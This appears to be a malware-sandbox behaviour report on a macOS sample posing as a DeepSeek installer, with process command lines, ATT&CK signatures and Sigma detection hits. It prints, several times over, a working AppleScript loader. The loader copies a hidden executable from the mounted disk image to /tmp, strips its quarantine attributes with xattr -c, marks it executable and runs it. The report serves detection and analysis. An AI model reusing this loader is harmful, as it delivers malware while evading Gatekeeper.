text_highlighted: bash: line 1: osascript: command not found

children.name:
["bash", "-c", "#!/bin/bash
osascript -e 'on run
    try
        set volumeList to list disks
    end try
    set setupVolume to ""
    try
        repeat with vol in volumeList
            if vol contains "DeepSeek" then
                set setupVolume to vol
                exit repeat
            end if
        end repeat
    end try
    if setupVolume is "" then
        return
    end if
    set scriptDir to "/Volumes/" & setupVolume & "/"
    set executableName to ".DeepSeek"
    set executablePath to scriptDir & executableName
    set tmpExecutablePath to "/tmp/" & executableName
    try
        do shell script "rm -f " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "cp " & quoted form of executablePath & " " & quoted form of tmpExecutablePath
    end try
    try
    "...]

/usr/bin/osascript osascript -e on run    try        set volumeList to list disks    end try    set setupVolume to ''    try        repeat with vol in volumeList            if vol contains 'DeepSeek' then                set setupVolume to vol                exit repeat            end if        end repeat    end try    if setupVolume is '' then        return    end if    set scriptDir to '/Volumes/' & setupVolume & '/'    set executableName to '.DeepSeek'    set executablePath to scriptDir & executableName    set tmpExecutablePath to '/tmp/' & executableName    try        do shell script 'rm -f ' & quoted form of tmpExecutablePath    end try    try        do shell script 'cp ' & quoted form of executablePath & ' ' & quoted form of tmpExecutablePath    end try    try        do shell script 'xattr -c ' & quoted form of tmpExecutablePath    end try    try        do shell script 'chmod +x ' & quoted form of tmpExecutablePath    end try    try        do shell script quoted form of tmpExecutablePath    end tryend run

/usr/bin/bash bash -c "#!/bin/bash
osascript -e 'on run
    try
        set volumeList to list disks
    end try
    set setupVolume to ""
    try
        repeat with vol in volumeList
            if vol contains "DeepSeek" then
                set setupVolume to vol
                exit repeat
            end if
        end repeat
    end try
    if setupVolume is "" then
        return
    end if
    set scriptDir to "/Volumes/" & setupVolume & "/"
    set executableName to ".DeepSeek"
    set executablePath to scriptDir & executableName
    set tmpExecutablePath to "/tmp/" & executableName
    try
        do shell script "rm -f " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "cp " & quoted form of executablePath & " " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "xattr -c " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "chmod +x " & quoted form of tmpExecutablePath
    end try
    try
        do shell script quoted form of tmpExecutablePath
    end try
end run'"

mitre_attack_techniques.signature_description: Executes commands using a shell command-line interpreter
Uses AppleScript framework/components containing Apple Script related functionalities
Uses AppleScript scripting additions containing additional functionalities for Apple Scripts
Executes Apple scripts and/or other OSA language scripts with shell command 'osascript'
Reads file resource fork extended attributes
Reads the system or server version plist file
Uses the "uname" system call to query kernel version information (possible evasion)

sigma_analysis_results.rule_title: Execution Of Script Located In Potentially Suspicious Directory
sigma_analysis_results.rule_description: Detects executions of scripts located in potentially suspicious locations such as "/tmp" via a shell such as "bash", "sh", etc.
Detects usage of base64 utility to decode arbitrary base64-encoded text

osascript -e 'on run
    try
        set volumeList to list disks
    end try
    set setupVolume to ""
    try
        repeat with vol in volumeList
            if vol contains "DeepSeek" then
                set setupVolume to vol
                exit repeat
            end if

    set scriptDir to "/Volumes/" & setupVolume & "/"

end run'"
